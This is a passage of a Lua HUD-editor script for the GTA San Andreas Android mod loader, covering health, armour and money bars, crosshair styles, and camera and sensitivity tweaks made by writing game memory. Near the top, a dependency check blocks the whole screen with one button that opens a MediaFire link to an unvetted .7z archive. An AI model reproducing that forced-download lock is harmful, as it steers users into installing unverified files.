local ffi = require "ffi"
ffi.cdef("void _Z12AND_OpenLinkPKc(const char* link);")
local gtasa = ffi.load("GTASA")
function openLink(link)
    gtasa._Z12AND_OpenLinkPKc(link)
end
local imgui = require "mimgui"
local dependenciasOk = false
local showTrava = imgui.new.bool(false)
local texVida = nil
local texColete = nil
function verificarDependencias()
    local webDir = getWorkingDirectory() .. "/web"
    local coletePath = webDir .. "/shelldercolete.png"
    local vidaPath = webDir .. "/shelldervida.png"
    if doesFileExist(webDir) and doesFileExist(coletePath) and doesFileExist(vidaPath) then
        local fileColete = io.open(coletePath, "rb")
        local fileVida = io.open(vidaPath, "rb")
        if fileColete and fileVida then
            local sizeColete = fileColete:seek("end")
            local sizeVida = fileVida:seek("end")
            fileColete:close()
            fileVida:close()
            local coleteOk = math.abs(sizeColete - 486113) < 1024
            local vidaOk = math.abs(sizeVida - 685250) < 1024
            if coleteOk and vidaOk then
                dependenciasOk = true
                return true
            end
        end
    end
    dependenciasOk = false
    return false
end
imgui.OnFrame(function() return showTrava[0] end, function()
    local sw, sh = getScreenResolution()
    imgui.SetNextWindowPos(imgui.ImVec2(0, 0))
    imgui.SetNextWindowSize(imgui.ImVec2(sw, sh))
    imgui.PushStyleColor(imgui.Col.WindowBg, imgui.ImVec4(0, 0, 0, 1))
    imgui.Begin("TRAVA", showTrava, imgui.WindowFlags.NoTitleBar + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoMove + imgui.WindowFlags.NoScrollbar)
    imgui.SetCursorPos(imgui.ImVec2(sw/2 - 100, sh/2 - 60))
    imgui.Text("INSTALAR DEPENDENCIAS")
    imgui.SetCursorPos(imgui.ImVec2(sw/2 - 100, sh/2))
    imgui.PushStyleColor(imgui.Col.Button, imgui.ImVec4(0.8, 0.1, 0.1, 1.0))
    imgui.PushStyleColor(imgui.Col.ButtonHovered, imgui.ImVec4(1.0, 0.2, 0.2, 1.0))
    imgui.PushStyleColor(imgui.Col.ButtonActive, imgui.ImVec4(0.6, 0.0, 0.0, 1.0))
    if imgui.Button("INSTALAR", imgui.ImVec2(200, 60)) then
        openLink("https://www.mediafire.com/file/hdmilzb8eqfdz0d/DEPENDENCIAS+13-01-2026.7z/file")
    end
    imgui.PopStyleColor(3)
    imgui.End()
    imgui.PopStyleColor(1)
end)
local faicons = require "fAwesome6"
local json = require "json"
local memory = require "memory"
local monethook = require "monethook"
local SAMemory = require "SAMemory"
SAMemory.require("CCamera")
local camera = SAMemory.camera
require("SAMemory.shared").require("RenderWare")
local configPadrao = {
    vidaX = 1479,
    vidaY = 92,
    coleteX = 1479,
    coleteY = 134,
    dinheiroX = 1551,
    dinheiroY = 175,
    vidaLargura = 50,
    vidaAltura = 29,
    coleteLargura = 50,
    coleteAltura = 29,
    tamanhoDinheiro = 63.0,
    tamanhoBordaDinheiro = 1.0,
    raioBorda = 4.0,
    corVida = {0.6, 0.0, 1.0, 1.0},
    corColete = {0.3, 0.1, 0.5, 1.0},
    corDinheiro = {0.7, 0.5, 0.9, 1.0},
    corBordaDinheiro = {0.0, 0.0, 0.0, 0.0},
    deslocamentoIconeX = -35,
    deslocamentoIconeY = 0,
    tamanhoIcone = 22.0,
    corFonte = {1.0, 1.0, 1.0, 1.0},
    tamanhoFonteHP = 13.0,
    tamanhoFonteAP = 13.0,
    tamanhoFonteDinheiro = 13.0,
    fonteHPX = 10,
    fonteHPY = 7,
    fonteAPX = 10,
    fonteAPY = 7,
    miraAtivada = true,
    miraX = 0,
    miraY = 0,
    miraTamanho = 10.0,
    miraLargura = 2.0,
    corMira = {1.0, 1.0, 1.0, 1.0},
    miraBordaAtivada = true,
    miraTamanhoBorda = 1.0,
    corBordaMira = {0.0, 0.0, 0.0, 1.0},
    miraTipo = 1,
    tempoId = 12,
    climaId = 0,
    climaAtivo = false,
    fovAtivado = false,
    valorFov = 60,
    somenteNumerosHPAP = false,
    emojisAtivados = true,
    sensibilidade = 50,
    fixedZoom = 0,
    renderDistance = 600
}
local config = {}
for k, v in pairs(configPadrao) do
    config[k] = v
end
local estado = {
    vida = 100.0,
    colete = 100.0,
    dinheiro = 0,
    modoEdicao = imgui.new.bool(false),
    opacidadeTexto = imgui.new.float(1.0),
    direcaoFade = 1,
    indiceCor = 1,
    ultimoSalvamento = os.clock(),
    zoomLevel = 0,
    fovAtivo = false
}
local listaCores = {
    {0.8, 0.8, 0.8, 1.0},
    {1.0, 1.0, 1.0, 1.0},
    {0.6, 0.4, 0.2, 1.0},
    {0.0, 1.0, 0.0, 1.0},
    {1.0, 0.0, 0.0, 1.0},
    {1.0, 0.0, 1.0, 1.0}
}
local tiposMira = {
    "Cruz Simples",
    "Cruz Dupla", 
    "Circulo",
    "Quadrado",
    "X",
    "Ponto",
    "Alvo",
    "Diamante",
    "Estrela",
    "Triangulo",
    "Cruz Fina",
    "Cruz Grossa", 
    "Circulo Duplo",
    "Quadrado Vazado",
    "X com Ponto",
    "Alvo Precisão",
    "Diamante Vazado",
    "Estrela 6 Pontas",
    "Triangulo Invertido",
    "Cruz Suíça",
    "Alvo Tático",
    "Ponto Duplo",
    "Círculo com Cruz",
    "Quadrado com Cruz",
    "X com Círculo",
    "Hexágono",
    "Octógono",
    "Círculo Segmentado",
    "Cruz Tática",
    "Alvo Avançado"
}
local variaveis = {
    vidaX = imgui.new.int(config.vidaX),
    vidaY = imgui.new.int(config.vidaY),
    vidaLargura = imgui.new.int(config.vidaLargura),
    vidaAltura = imgui.new.int(config.vidaAltura),
    coleteX = imgui.new.int(config.coleteX),
    coleteY = imgui.new.int(config.coleteY),
    coleteLargura = imgui.new.int(config.coleteLargura),
    coleteAltura = imgui.new.int(config.coleteAltura),
    dinheiroX = imgui.new.int(config.dinheiroX),
    dinheiroY = imgui.new.int(config.dinheiroY),
    tamanhoDinheiro = imgui.new.float(config.tamanhoDinheiro),
    tamanhoBordaDinheiro = imgui.new.float(config.tamanhoBordaDinheiro),
    raioBorda = imgui.new.float(config.raioBorda),
    tamanhoFonteHP = imgui.new.float(config.tamanhoFonteHP),
    tamanhoFonteAP = imgui.new.float(config.tamanhoFonteAP),
    tamanhoFonteDinheiro = imgui.new.float(config.tamanhoFonteDinheiro),
    deslocamentoIconeX = imgui.new.int(config.deslocamentoIconeX),
    deslocamentoIconeY = imgui.new.int(config.deslocamentoIconeY),
    tamanhoIcone = imgui.new.float(config.tamanhoIcone),
    fonteHPX = imgui.new.int(config.fonteHPX),
    fonteHPY = imgui.new.int(config.fonteHPY),
    fonteAPX = imgui.new.int(config.fonteAPX),
    fonteAPY = imgui.new.int(config.fonteAPY),
    miraAtivada = imgui.new.bool(config.miraAtivada),
    miraX = imgui.new.int(config.miraX),
    miraY = imgui.new.int(config.miraY),
    miraTamanho = imgui.new.float(config.miraTamanho),
    miraLargura = imgui.new.float(config.miraLargura),
    corMira = imgui.new.float[4](config.corMira[1], config.corMira[2], config.corMira[3], config.corMira[4]),
    miraBordaAtivada = imgui.new.bool(config.miraBordaAtivada),
    miraTamanhoBorda = imgui.new.float(config.miraTamanhoBorda),
    corBordaMira = imgui.new.float[4](config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
    miraTipo = imgui.new.int(config.miraTipo),
    corVida = imgui.new.float[4](config.corVida[1], config.corVida[2], config.corVida[3], config.corVida[4]),
    corColete = imgui.new.float[4](config.corColete[1], config.corColete[2], config.corColete[3], config.corColete[4]),
    corDinheiro = imgui.new.float[4](config.corDinheiro[1], config.corDinheiro[2], config.corDinheiro[3], config.corDinheiro[4]),
    corBordaDinheiro = imgui.new.float[4](config.corBordaDinheiro[1], config.corBordaDinheiro[2], config.corBordaDinheiro[3], config.corBordaDinheiro[4]),
    corFonte = imgui.new.float[4](config.corFonte[1], config.corFonte[2], config.corFonte[3], config.corFonte[4]),
    moverJuntos = imgui.new.bool(true),
    moverFontesJuntas = imgui.new.bool(true),
    tempoId = imgui.new.int(config.tempoId),
    climaId = imgui.new.int(config.climaId),
    climaAtivo = imgui.new.bool(config.climaAtivo),
    fovAtivado = imgui.new.bool(config.fovAtivado),
    valorFov = imgui.new.int(config.valorFov),
    somenteNumerosHPAP = imgui.new.bool(config.somenteNumerosHPAP),
    emojisAtivados = imgui.new.bool(config.emojisAtivados),
    sensibilidade = imgui.new.float(config.sensibilidade),
    fixedZoom = imgui.new.float(config.fixedZoom),
    renderDistance = imgui.new.float(config.renderDistance)
}
local function rgba(r, g, b, a)
    return imgui.ColorConvertFloat4ToU32(imgui.ImVec4(r, g, b, a))
end
local function formatarDinheiro(valor)
    local formatado = tostring(valor)
    local k
    while true do
        formatado, k = string.gsub(formatado, "^(-?%d+)(%d%d%d)", '%1.%2')
        if k == 0 then break end
    end
    return formatado
end
local function salvarConfig()
    config.vidaX = variaveis.vidaX[0]
    config.vidaY = variaveis.vidaY[0]
    config.vidaLargura = variaveis.vidaLargura[0]
    config.vidaAltura = variaveis.vidaAltura[0]
    config.coleteX = variaveis.coleteX[0]
    config.coleteY = variaveis.coleteY[0]
    config.coleteLargura = variaveis.coleteLargura[0]
    config.coleteAltura = variaveis.coleteAltura[0]
    config.dinheiroX = variaveis.dinheiroX[0]
    config.dinheiroY = variaveis.dinheiroY[0]
    config.tamanhoDinheiro = variaveis.tamanhoDinheiro[0]
    config.tamanhoBordaDinheiro = variaveis.tamanhoBordaDinheiro[0]
    config.raioBorda = variaveis.raioBorda[0]
    config.tamanhoFonteHP = variaveis.tamanhoFonteHP[0]
    config.tamanhoFonteAP = variaveis.tamanhoFonteAP[0]
    config.tamanhoFonteDinheiro = variaveis.tamanhoFonteDinheiro[0]
    config.deslocamentoIconeX = variaveis.deslocamentoIconeX[0]
    config.deslocamentoIconeY = variaveis.deslocamentoIconeY[0]
    config.tamanhoIcone = variaveis.tamanhoIcone[0]
    config.fonteHPX = variaveis.fonteHPX[0]
    config.fonteHPY = variaveis.fonteHPY[0]
    config.fonteAPX = variaveis.fonteAPX[0]
    config.fonteAPY = variaveis.fonteAPY[0]
    config.miraAtivada = variaveis.miraAtivada[0]
    config.miraX = variaveis.miraX[0]
    config.miraY = variaveis.miraY[0]
    config.miraTamanho = variaveis.miraTamanho[0]
    config.miraLargura = variaveis.miraLargura[0]
    config.miraBordaAtivada = variaveis.miraBordaAtivada[0]
    config.miraTamanhoBorda = variaveis.miraTamanhoBorda[0]
    config.miraTipo = variaveis.miraTipo[0]
    config.tempoId = variaveis.tempoId[0]
    config.climaId = variaveis.climaId[0]
    config.climaAtivo = variaveis.climaAtivo[0]
    config.fovAtivado = variaveis.fovAtivado[0]
    config.valorFov = variaveis.valorFov[0]
    config.somenteNumerosHPAP = variaveis.somenteNumerosHPAP[0]
    config.emojisAtivados = variaveis.emojisAtivados[0]
    config.sensibilidade = variaveis.sensibilidade[0]
    config.fixedZoom = variaveis.fixedZoom[0]
    config.renderDistance = variaveis.renderDistance[0]
    config.corMira = {variaveis.corMira[0], variaveis.corMira[1], variaveis.corMira[2], variaveis.corMira[3]}
    config.corBordaMira = {variaveis.corBordaMira[0], variaveis.corBordaMira[1], variaveis.corBordaMira[2], variaveis.corBordaMira[3]}
    config.corVida = {variaveis.corVida[0], variaveis.corVida[1], variaveis.corVida[2], variaveis.corVida[3]}
    config.corColete = {variaveis.corColete[0], variaveis.corColete[1], variaveis.corColete[2], variaveis.corColete[3]}
    config.corDinheiro = {variaveis.corDinheiro[0], variaveis.corDinheiro[1], variaveis.corDinheiro[2], variaveis.corDinheiro[3]}
    config.corBordaDinheiro = {variaveis.corBordaDinheiro[0], variaveis.corBordaDinheiro[1], variaveis.corBordaDinheiro[2], variaveis.corBordaDinheiro[3]}
    config.corFonte = {variaveis.corFonte[0], variaveis.corFonte[1], variaveis.corFonte[2], variaveis.corFonte[3]}
    local caminhoArquivo = "/storage/emulated/0/.hudeditshellderwsw.json"
    local arquivo = io.open(caminhoArquivo, "w")
    if arquivo then
        arquivo:write(json.encode(config))
        arquivo:close()
    end
end
local function resetarConfiguracao()
    for k, v in pairs(configPadrao) do
        config[k] = v
    end
    variaveis.vidaX[0] = configPadrao.vidaX
    variaveis.vidaY[0] = configPadrao.vidaY
    variaveis.vidaLargura[0] = configPadrao.vidaLargura
    variaveis.vidaAltura[0] = configPadrao.vidaAltura
    variaveis.coleteX[0] = configPadrao.coleteX
    variaveis.coleteY[0] = configPadrao.coleteY
    variaveis.coleteLargura[0] = configPadrao.coleteLargura
    variaveis.coleteAltura[0] = configPadrao.coleteAltura
    variaveis.dinheiroX[0] = configPadrao.dinheiroX
    variaveis.dinheiroY[0] = configPadrao.dinheiroY
    variaveis.tamanhoDinheiro[0] = configPadrao.tamanhoDinheiro
    variaveis.tamanhoBordaDinheiro[0] = configPadrao.tamanhoBordaDinheiro
    variaveis.raioBorda[0] = configPadrao.raioBorda
    variaveis.tamanhoFonteHP[0] = configPadrao.tamanhoFonteHP
    variaveis.tamanhoFonteAP[0] = configPadrao.tamanhoFonteAP
    variaveis.tamanhoFonteDinheiro[0] = configPadrao.tamanhoFonteDinheiro
    variaveis.deslocamentoIconeX[0] = configPadrao.deslocamentoIconeX
    variaveis.deslocamentoIconeY[0] = configPadrao.deslocamentoIconeY
    variaveis.tamanhoIcone[0] = configPadrao.tamanhoIcone
    variaveis.fonteHPX[0] = configPadrao.fonteHPX
    variaveis.fonteHPY[0] = configPadrao.fonteHPY
    variaveis.fonteAPX[0] = configPadrao.fonteAPX
    variaveis.fonteAPY[0] = configPadrao.fonteAPY
    variaveis.miraAtivada[0] = configPadrao.miraAtivada
    variaveis.miraX[0] = configPadrao.miraX
    variaveis.miraY[0] = configPadrao.miraY
    variaveis.miraTamanho[0] = configPadrao.miraTamanho
    variaveis.miraLargura[0] = configPadrao.miraLargura
    variaveis.miraBordaAtivada[0] = configPadrao.miraBordaAtivada
    variaveis.miraTamanhoBorda[0] = configPadrao.miraTamanhoBorda
    variaveis.miraTipo[0] = configPadrao.miraTipo
    variaveis.tempoId[0] = configPadrao.tempoId
    variaveis.climaId[0] = configPadrao.climaId
    variaveis.climaAtivo[0] = configPadrao.climaAtivo
    variaveis.fovAtivado[0] = configPadrao.fovAtivado
    variaveis.valorFov[0] = configPadrao.valorFov
    variaveis.somenteNumerosHPAP[0] = configPadrao.somenteNumerosHPAP
    variaveis.emojisAtivados[0] = configPadrao.emojisAtivados
    variaveis.sensibilidade[0] = configPadrao.sensibilidade
    variaveis.fixedZoom[0] = configPadrao.fixedZoom
    variaveis.renderDistance[0] = configPadrao.renderDistance
    variaveis.corVida[0] = configPadrao.corVida[1]
    variaveis.corVida[1] = configPadrao.corVida[2]
    variaveis.corVida[2] = configPadrao.corVida[3]
    variaveis.corVida[3] = configPadrao.corVida[4]
    variaveis.corColete[0] = configPadrao.corColete[1]
    variaveis.corColete[1] = configPadrao.corColete[2]
    variaveis.corColete[2] = configPadrao.corColete[3]
    variaveis.corColete[3] = configPadrao.corColete[4]
    variaveis.corDinheiro[0] = configPadrao.corDinheiro[1]
    variaveis.corDinheiro[1] = configPadrao.corDinheiro[2]
    variaveis.corDinheiro[2] = configPadrao.corDinheiro[3]
    variaveis.corDinheiro[3] = configPadrao.corDinheiro[4]
    variaveis.corBordaDinheiro[0] = configPadrao.corBordaDinheiro[1]
    variaveis.corBordaDinheiro[1] = configPadrao.corBordaDinheiro[2]
    variaveis.corBordaDinheiro[2] = configPadrao.corBordaDinheiro[3]
    variaveis.corBordaDinheiro[3] = configPadrao.corBordaDinheiro[4]
    variaveis.corFonte[0] = configPadrao.corFonte[1]
    variaveis.corFonte[1] = configPadrao.corFonte[2]
    variaveis.corFonte[2] = configPadrao.corFonte[3]
    variaveis.corFonte[3] = configPadrao.corFonte[4]
    variaveis.corMira[0] = configPadrao.corMira[1]
    variaveis.corMira[1] = configPadrao.corMira[2]
    variaveis.corMira[2] = configPadrao.corMira[3]
    variaveis.corMira[3] = configPadrao.corMira[4]
    variaveis.corBordaMira[0] = configPadrao.corBordaMira[1]
    variaveis.corBordaMira[1] = configPadrao.corBordaMira[2]
    variaveis.corBordaMira[2] = configPadrao.corBordaMira[3]
    variaveis.corBordaMira[3] = configPadrao.corBordaMira[4]
    salvarConfig()
    sampAddChatMessage("{FFFFFF}[HUD EDIT] {FF0000}Configuracoes resetadas!", -1)
end
local function carregarConfig()
    local caminhoArquivo = "/storage/emulated/0/.hudeditshellderwsw.json"
    if doesFileExist(caminhoArquivo) then
        local arquivo = io.open(caminhoArquivo, "r")
        if arquivo then
            local conteudo = arquivo:read("*a")
            arquivo:close()
            if conteudo == nil or conteudo == "" then return end
            local status, salvo = pcall(json.decode, conteudo)
            if status and salvo then
                for k, v in pairs(configPadrao) do
                    config[k] = salvo[k] or v
                end
                variaveis.vidaX[0] = salvo.vidaX or configPadrao.vidaX
                variaveis.vidaY[0] = salvo.vidaY or configPadrao.vidaY
                variaveis.vidaLargura[0] = salvo.vidaLargura or configPadrao.vidaLargura
                variaveis.vidaAltura[0] = salvo.vidaAltura or configPadrao.vidaAltura
                variaveis.coleteX[0] = salvo.coleteX or configPadrao.coleteX
                variaveis.coleteY[0] = salvo.coleteY or configPadrao.coleteY
                variaveis.coleteLargura[0] = salvo.coleteLargura or configPadrao.coleteLargura
                variaveis.coleteAltura[0] = salvo.coleteAltura or configPadrao.coleteAltura
                variaveis.dinheiroX[0] = salvo.dinheiroX or configPadrao.dinheiroX
                variaveis.dinheiroY[0] = salvo.dinheiroY or configPadrao.dinheiroY
                variaveis.tamanhoDinheiro[0] = salvo.tamanhoDinheiro or configPadrao.tamanhoDinheiro
                variaveis.tamanhoBordaDinheiro[0] = salvo.tamanhoBordaDinheiro or configPadrao.tamanhoBordaDinheiro
                variaveis.raioBorda[0] = salvo.raioBorda or configPadrao.raioBorda
                variaveis.tamanhoFonteHP[0] = salvo.tamanhoFonteHP or configPadrao.tamanhoFonteHP
                variaveis.tamanhoFonteAP[0] = salvo.tamanhoFonteAP or configPadrao.tamanhoFonteAP
                variaveis.tamanhoFonteDinheiro[0] = salvo.tamanhoFonteDinheiro or configPadrao.tamanhoFonteDinheiro
                variaveis.deslocamentoIconeX[0] = salvo.deslocamentoIconeX or configPadrao.deslocamentoIconeX
                variaveis.deslocamentoIconeY[0] = salvo.deslocamentoIconeY or configPadrao.deslocamentoIconeY
                variaveis.tamanhoIcone[0] = salvo.tamanhoIcone or configPadrao.tamanhoIcone
                variaveis.fonteHPX[0] = salvo.fonteHPX or configPadrao.fonteHPX
                variaveis.fonteHPY[0] = salvo.fonteHPY or configPadrao.fonteHPY
                variaveis.fonteAPX[0] = salvo.fonteAPX or configPadrao.fonteAPX
                variaveis.fonteAPY[0] = salvo.fonteAPY or configPadrao.fonteAPY
                variaveis.miraAtivada[0] = salvo.miraAtivada ~= nil and salvo.miraAtivada or configPadrao.miraAtivada
                variaveis.miraX[0] = salvo.miraX or configPadrao.miraX
                variaveis.miraY[0] = salvo.miraY or configPadrao.miraY
                variaveis.miraTamanho[0] = salvo.miraTamanho or configPadrao.miraTamanho
                variaveis.miraLargura[0] = salvo.miraLargura or configPadrao.miraLargura
                variaveis.miraBordaAtivada[0] = salvo.miraBordaAtivada ~= nil and salvo.miraBordaAtivada or configPadrao.miraBordaAtivada
                variaveis.miraTamanhoBorda[0] = salvo.miraTamanhoBorda or configPadrao.miraTamanhoBorda
                variaveis.miraTipo[0] = salvo.miraTipo or configPadrao.miraTipo
                variaveis.tempoId[0] = salvo.tempoId or configPadrao.tempoId
                variaveis.climaId[0] = salvo.climaId or configPadrao.climaId
                variaveis.climaAtivo[0] = salvo.climaAtivo ~= nil and salvo.climaAtivo or configPadrao.climaAtivo
                variaveis.fovAtivado[0] = salvo.fovAtivado ~= nil and salvo.fovAtivado or configPadrao.fovAtivado
                variaveis.valorFov[0] = salvo.valorFov or configPadrao.valorFov
                variaveis.somenteNumerosHPAP[0] = salvo.somenteNumerosHPAP ~= nil and salvo.somenteNumerosHPAP or configPadrao.somenteNumerosHPAP
                variaveis.emojisAtivados[0] = salvo.emojisAtivados ~= nil and salvo.emojisAtivados or configPadrao.emojisAtivados
                variaveis.sensibilidade[0] = salvo.sensibilidade or configPadrao.sensibilidade
                variaveis.fixedZoom[0] = salvo.fixedZoom or configPadrao.fixedZoom
                variaveis.renderDistance[0] = salvo.renderDistance or configPadrao.renderDistance
                if salvo.corVida then
                    variaveis.corVida[0] = salvo.corVida[1] or configPadrao.corVida[1]
                    variaveis.corVida[1] = salvo.corVida[2] or configPadrao.corVida[2]
                    variaveis.corVida[2] = salvo.corVida[3] or configPadrao.corVida[3]
                    variaveis.corVida[3] = salvo.corVida[4] or configPadrao.corVida[4]
                end
                if salvo.corColete then
                    variaveis.corColete[0] = salvo.corColete[1] or configPadrao.corColete[1]
                    variaveis.corColete[1] = salvo.corColete[2] or configPadrao.corColete[2]
                    variaveis.corColete[2] = salvo.corColete[3] or configPadrao.corColete[3]
                    variaveis.corColete[3] = salvo.corColete[4] or configPadrao.corColete[4]
                end
                if salvo.corDinheiro then
                    variaveis.corDinheiro[0] = salvo.corDinheiro[1] or configPadrao.corDinheiro[1]
                    variaveis.corDinheiro[1] = salvo.corDinheiro[2] or configPadrao.corDinheiro[2]
                    variaveis.corDinheiro[2] = salvo.corDinheiro[3] or configPadrao.corDinheiro[3]
                    variaveis.corDinheiro[3] = salvo.corDinheiro[4] or configPadrao.corDinheiro[4]
                end
                if salvo.corBordaDinheiro then
                    variaveis.corBordaDinheiro[0] = salvo.corBordaDinheiro[1] or configPadrao.corBordaDinheiro[1]
                    variaveis.corBordaDinheiro[1] = salvo.corBordaDinheiro[2] or configPadrao.corBordaDinheiro[2]
                    variaveis.corBordaDinheiro[2] = salvo.corBordaDinheiro[3] or configPadrao.corBordaDinheiro[3]
                    variaveis.corBordaDinheiro[3] = salvo.corBordaDinheiro[4] or configPadrao.corBordaDinheiro[4]
                end
                if salvo.corFonte then
                    variaveis.corFonte[0] = salvo.corFonte[1] or configPadrao.corFonte[1]
                    variaveis.corFonte[1] = salvo.corFonte[2] or configPadrao.corFonte[2]
                    variaveis.corFonte[2] = salvo.corFonte[3] or configPadrao.corFonte[3]
                    variaveis.corFonte[3] = salvo.corFonte[4] or configPadrao.corFonte[4]
                end
                if salvo.corMira then
                    variaveis.corMira[0] = salvo.corMira[1] or configPadrao.corMira[1]
                    variaveis.corMira[1] = salvo.corMira[2] or configPadrao.corMira[2]
                    variaveis.corMira[2] = salvo.corMira[3] or configPadrao.corMira[3]
                    variaveis.corMira[3] = salvo.corMira[4] or configPadrao.corMira[4]
                end
                if salvo.corBordaMira then
                    variaveis.corBordaMira[0] = salvo.corBordaMira[1] or configPadrao.corBordaMira[1]
                    variaveis.corBordaMira[1] = salvo.corBordaMira[2] or configPadrao.corBordaMira[2]
                    variaveis.corBordaMira[2] = salvo.corBordaMira[3] or configPadrao.corBordaMira[3]
                    variaveis.corBordaMira[3] = salvo.corBordaMira[4] or configPadrao.corBordaMira[4]
                end
            end
        end
    end
end
local function verificarMudancasESalvar()
    salvarConfig()
end
local sensibilidadeEndereco = MONET_GTASA_BASE + 6987568
local function aplicarSensibilidade(valor)
    memory.setfloat(sensibilidadeEndereco, 0.001 + valor / 3000)
end
local function setCameraRenderDistance(distancia)
    camera.pRwCamera.farplane = distancia
end
local function setCameraZoom(zoom)
    if isCurrentCharWeapon(PLAYER_PED, 34) and isCharPlayingAnim(PLAYER_PED, "gun_stand") or zoom == 0 then
        camera.bUseScriptZoomValuePed = false
    else
        camera.bUseScriptZoomValuePed = true
    end
    camera.fPedZoomValueScript = zoom
end
local fonteDinheiro, fonteHP, fonteAP
imgui.OnInitialize(function()
    local conf = imgui.ImFontConfig()
    conf.MergeMode = true
    conf.PixelSnapH = true
    local intervalosIcones = imgui.new.ImWchar[3](faicons.min_range, faicons.max_range, 0)
    imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(
        faicons.get_font_data_base85("Solid"), 22, conf, intervalosIcones
    )
    fonteDinheiro = imgui.GetIO().Fonts:AddFontDefault()
    fonteHP = imgui.GetIO().Fonts:AddFontDefault()
    fonteAP = imgui.GetIO().Fonts:AddFontDefault()
    imgui.GetIO().Fonts:Build()
end)
local function limitarBarra(percentual, larguraMaxima)
    return larguraMaxima
end
local function calcularPreenchimento(valorAtual, valorMaximo, larguraMaxima)
    local percentual = math.min(valorAtual / valorMaximo, 1.0)
    return percentual * larguraMaxima
end
local function desenharHUDOriginal(desenho, pos)
    local vidaMaxima = 100
    local coleteMaximo = 100
    local preenchimentoVida = calcularPreenchimento(math.min(estado.vida, 100), vidaMaxima, config.vidaLargura)
    local preenchimentoColete = calcularPreenchimento(math.min(estado.colete, 100), coleteMaximo, config.coleteLargura)
    local larguraBarraVida = config.vidaLargura
    local larguraBarraColete = config.coleteLargura
    local fundoVida = imgui.ImVec2(pos.x + config.vidaX, pos.y + config.vidaY)
    local fimVida = imgui.ImVec2(pos.x + config.vidaX + config.vidaLargura, pos.y + config.vidaY + config.vidaAltura)
    local frenteVida = imgui.ImVec2(pos.x + config.vidaX + preenchimentoVida, pos.y + config.vidaY + config.vidaAltura)
    desenho:AddRectFilled(fundoVida, fimVida, rgba(0.1, 0.1, 0.1, 0.8), config.raioBorda)
    if preenchimentoVida > 0 then
        desenho:AddRectFilled(fundoVida, frenteVida, rgba(config.corVida[1], config.corVida[2], config.corVida[3], config.corVida[4]), config.raioBorda)
    end
    imgui.SetWindowFontScale(config.tamanhoFonteHP / 13.0)
    local textoVida = string.format("%d", math.floor(estado.vida))
    if not config.somenteNumerosHPAP then
        textoVida = textoVida .. " HP"
    end
    local posTextoVida = imgui.ImVec2(
        pos.x + config.vidaX + config.fonteHPX, 
        pos.y + config.vidaY + config.fonteHPY
    )
    for i = 0, 1 do
        desenho:AddText(imgui.ImVec2(posTextoVida.x + i, posTextoVida.y), rgba(config.corFonte[1], config.corFonte[2], config.corFonte[3], config.corFonte[4]), textoVida)
    end
    imgui.SetWindowFontScale(1.0)
    if config.emojisAtivados and texVida then
        local iconePos = imgui.ImVec2(pos.x + config.vidaX + config.deslocamentoIconeX, pos.y + config.vidaY + config.deslocamentoIconeY)
        desenho:AddImage(texVida, iconePos, imgui.ImVec2(iconePos.x + config.tamanhoIcone, iconePos.y + config.tamanhoIcone))
    end
    local fundoColete = imgui.ImVec2(pos.x + config.coleteX, pos.y + config.coleteY)
    local fimColete = imgui.ImVec2(pos.x + config.coleteX + config.coleteLargura, pos.y + config.coleteY + config.coleteAltura)
    local frenteColete = imgui.ImVec2(pos.x + config.coleteX + preenchimentoColete, pos.y + config.coleteY + config.coleteAltura)
    desenho:AddRectFilled(fundoColete, fimColete, rgba(0.1, 0.1, 0.1, 0.8), config.raioBorda)
    if preenchimentoColete > 0 then
        desenho:AddRectFilled(fundoColete, frenteColete, rgba(config.corColete[1], config.corColete[2], config.corColete[3], config.corColete[4]), config.raioBorda)
    end
    imgui.SetWindowFontScale(config.tamanhoFonteAP / 13.0)
    local textoColete = string.format("%d", math.floor(estado.colete))
    if not config.somenteNumerosHPAP then
        textoColete = textoColete .. " AP"
    end
    local posTextoColete = imgui.ImVec2(
        pos.x + config.coleteX + config.fonteAPX, 
        pos.y + config.coleteY + config.fonteAPY
    )
    for i = 0, 1 do
        desenho:AddText(imgui.ImVec2(posTextoColete.x + i, posTextoColete.y), rgba(config.corFonte[1], config.corFonte[2], config.corFonte[3], config.corFonte[4]), textoColete)
    end
    imgui.SetWindowFontScale(1.0)
    if config.emojisAtivados and texColete then
        local iconePos = imgui.ImVec2(pos.x + config.coleteX + config.deslocamentoIconeX, pos.y + config.coleteY + config.deslocamentoIconeY)
        desenho:AddImage(texColete, iconePos, imgui.ImVec2(iconePos.x + config.tamanhoIcone, iconePos.y + config.tamanhoIcone))
    end
    imgui.SetWindowFontScale(config.tamanhoFonteDinheiro / 13.0)
    local textoDinheiro = "$" .. formatarDinheiro(estado.dinheiro)
    local posTexto = imgui.ImVec2(pos.x + config.dinheiroX, pos.y + config.dinheiroY)
    for x = -config.tamanhoBordaDinheiro, config.tamanhoBordaDinheiro, config.tamanhoBordaDinheiro do
        for y = -config.tamanhoBordaDinheiro, config.tamanhoBordaDinheiro, config.tamanhoBordaDinheiro do
            if x ~= 0 or y ~= 0 then
                desenho:AddText(imgui.ImVec2(posTexto.x + x, posTexto.y + y),
                    rgba(config.corBordaDinheiro[1], config.corBordaDinheiro[2], config.corBordaDinheiro[3], config.corBordaDinheiro[4]),
                    textoDinheiro)
            end
        end
    end
    for i = 0, 1 do
        desenho:AddText(imgui.ImVec2(posTexto.x + i, posTexto.y), rgba(config.corDinheiro[1], config.corDinheiro[2], config.corDinheiro[3], config.corDinheiro[4]), textoDinheiro)
    end
    imgui.SetWindowFontScale(1.0)
end
local function desenharMira(desenho, pos)
    if not config.miraAtivada then return end
    local larguraTela, alturaTela = getScreenResolution()
    local centroX = pos.x + larguraTela / 2 + config.miraX
    local centroY = pos.y + alturaTela / 2 + config.miraY
    local tamanho = config.miraTamanho
    local largura = config.miraLargura
    local tipo = config.miraTipo
    local metadeTamanho = tamanho / 2
    if config.miraBordaAtivada and config.miraTamanhoBorda > 0 then
        local borda = config.miraTamanhoBorda
        if tipo == 0 then
            desenho:AddLine(
                imgui.ImVec2(centroX - tamanho - borda, centroY),
                imgui.ImVec2(centroX + tamanho + borda, centroY),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
            desenho:AddLine(
                imgui.ImVec2(centroX, centroY - tamanho - borda),
                imgui.ImVec2(centroX, centroY + tamanho + borda),
                rgba(config.corBordaMira[1], config.corBordaMira[2], config.corBordaMira[3], config.corBordaMira[4]),
                largura + borda * 2
            )
        elseif tipo == 1 then
            desenho:AddLine(
